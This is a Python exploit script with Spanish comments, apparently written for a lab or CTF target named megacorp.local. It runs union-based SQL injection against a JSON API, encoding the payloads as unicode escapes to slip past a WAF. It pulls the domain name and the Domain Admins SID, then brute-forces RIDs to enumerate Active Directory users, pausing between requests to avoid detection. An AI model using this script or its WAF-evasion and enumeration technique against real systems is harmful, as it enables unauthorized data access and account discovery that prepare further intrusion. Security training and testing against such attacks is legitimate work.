#!/usr/bin/python3

import json
import traceback, binascii
import requests
from time import sleep
from impacket.dcerpc.v5.dtypes import SID
import struct

base_url = "http://megacorp.local/api/getColleagues"

import sys, signal
def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

def convert_input(output):
    '''
    Funcion para convertir la consulta SQL a carateres unicode
    '''       
    # El modificador :02x asegura que siempre ocupe 2 espacios (ej: '0a' en vez de 'a')
    utf = [f"\\u00{ord(i):02x}" for i in output]
    
    data_post = ''.join(utf)
    return data_post

def getdatasqli(sqili):
    '''
    Retorna datos filtrados de la base de datos mediante sql injection
    '''
    try:
        sqli_unicode = convert_input(sqili)
        post_data = '{"name":"%s"}' % sqli_unicode
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
            "Content-type": "text/json; charset=utf-8"
        }
            
        r = requests.post(base_url, headers=headers, data=post_data)
        r.raise_for_status()

        if r.status_code == 403:
            print("Las peticiones estan siendo bloqueadas por el WAF")

        data = json.loads(r.text)[0]["name"]
        return data
    except requests.exceptions.RequestException as e:
        print(f"Error en la solicitud: {e}")
        if e.response is not None:
            if e.response.status_code == 403:
                print("[+] Es posible que el WAF haya bloqueado las peticiones web. Esperando 30 segundos...")
                sleep(30)
                print("[+] Continuando enumeracion de usuarios...")

def hex_to_sid(hex_str):
    '''
    Convierte el SID devuelto por la base de datos a un SID canonico
    '''
    if hex_str.lower().startswith('0x'):
        hex_str = hex_str[2:]
    
    try:
        return SID(bytes.fromhex(hex_str)).formatCanonical()
    except ValueError as e:
        
        print(f"Error de formato hexadecimal: {e}")
        
    except struct.error as e:
        
        print(f"Error al parsear el SID con Impacket: {e}")
    except Exception as e:
        tipo_error = type(e).__name__
        traza_completa = traceback.format_exc()
        
        mensaje_detalle = (
            f"\n[!] Ocurrió un error de tipo: {tipo_error}\n"
            f"[!] Mensaje del sistema: {e}\n"
            f"[!] Detalles técnicos de la traza:\n"
            f"{'-'*50}\n"
            f"{traza_completa}"
            f"{'-'*50}\n"
        )
        print(mensaje_detalle)
    return None

def main():
    print("[+] Buscando un dominio valido")

    #sqlinjection destinada a encontrar el nombre de dominio
    sqilinjection = "test' union select 1,(select DEFAULT_DOMAIN()),3,4,5-- -"
    domain = getdatasqli(sqilinjection)
    print(f"[+] Dominio valido encontrado: {domain}")

    #sql injection destinada a encontrar el SID del usuario
    sqilinjection = f"test' union select 1,(master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\\Domain Admins'))),3,4,5-- -"
    sid = getdatasqli(sqilinjection)
    print(f"[+] SID valido encontrado: {sid[:-8]}")

    '''
    Buscando Usuarios en el dominio
    '''
    print("[+] Buscando usuarios en el dominio")
    for i in range(500, 10001):
        rid = binascii.hexlify(struct.pack("<I", i)).decode()
        sid_completo = f"{sid[:-8]}{rid}"

        sqilinjection = f"test' union select 1,(select SUSER_SNAME({sid_completo})),3,4,5-- -"
        usuarios = getdatasqli(sqilinjection)

        if usuarios:
            print(f"SID: {hex_to_sid(sid_completo)} Usuario: {usuarios}")

        sleep(2) #evita detecciones en el WAF
    
if __name__ == '__main__':
    main()
